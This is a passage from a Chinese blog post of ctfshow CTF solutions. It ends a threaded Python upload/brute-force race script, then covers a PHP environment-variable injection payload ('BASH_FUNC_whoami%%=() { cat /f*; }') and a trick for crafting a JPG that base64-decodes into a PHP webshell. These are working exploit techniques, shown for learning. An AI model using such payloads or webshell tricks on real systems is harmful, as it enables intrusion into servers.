close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.encode())</span><br><span class="line">			<span class="built_in">print</span>(s.recv(<span class="number">2048</span>).decode())</span><br><span class="line">			s.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    t = threading.Thread(target=upload)</span><br><span class="line">    t.start()</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    a = threading.Thread(target=bruter)</span><br><span class="line">    a.start()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="web819-环境变量注入"><a href="#web819-环境变量注入" class="headerlink" title="web819 环境变量注入"></a>web819 环境变量注入</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$env = $_GET[<span class="string">&#x27;env&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(isset($env))&#123;</span><br><span class="line">    putenv($env);</span><br><span class="line">    system(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?env=BASH_FUNC_whoami%%=() &#123; cat /f*; &#125;</span><br></pre></td></tr></table></figure>
+
+<p>参照p牛的文章</p>
+<h1 id="web820-奇怪的jpg型webshell"><a href="#web820-奇怪的jpg型webshell" class="headerlink" title="web820 奇怪的jpg型webshell"></a>web820 奇怪的jpg型webshell</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>])&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="variable">$filetype</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmpname</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$ef</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$tmpname</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( (<span class="variable">$filetype</span>==<span class="string">&quot;image/jpeg&quot;</span>) &amp;&amp; (<span class="variable">$ef</span>!=<span class="literal">false</span>) &amp;&amp; (<span class="variable">$ef</span>[<span class="string">&#x27;mime&#x27;</span>]==<span class="string">&#x27;image/jpeg&#x27;</span>))&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$tmpname</span>));</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;shell.php&quot;</span>, <span class="variable">$content</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;file upload success!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>主要是base64_decode这个函数在解码的时候仅保留26+26+2+10，也就是base64里的64个有效字符，其他字符会丢弃</p>
+<p>因此可以构造一个jpg，解码后是个webshell</p>
+<p>可以用010对一个1*1像素的图片构造</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220515225616-m8bgojg.png" alt="image.png"></p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://xianbeil.github.io/2022/05/16/ctfshow%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctfshow/" rel="tag">ctfshow</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2022/05/16/nginx%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            一小点临时文件姿势
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2022/05/11/springboot-web%E5%AD%A6%E4%B9%A001/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">springboot学习笔记-基础，自动配置与开发插件</div>
+      </a>
+    
+  </nav>
+
+  
+   
+    
+    <script src="https://cdn.staticfile.org/twikoo/1.4.18/twikoo.all.min.js"></script>
+    <div id="twikoo" class="twikoo"></div>
+    <script>
+        twikoo.init({
+            envId: ""
+        })
+    </script>
+ 
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2022
+        <i class="ri-heart-fill heart_icon"></i> John Doe
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/ayer-side.svg" alt="Hexo"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/friends">友链</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="https://tvax4.sinaimg.cn/large/9156bd04ly1gzofeba4nlj208c08c3z9.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="https://tvax4.sinaimg.cn/large/9156bd04ly1gzofeo49ywj208c08cgmz.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+ 
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+ 
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    
+
+  </div>
+</body>
+
+</html>
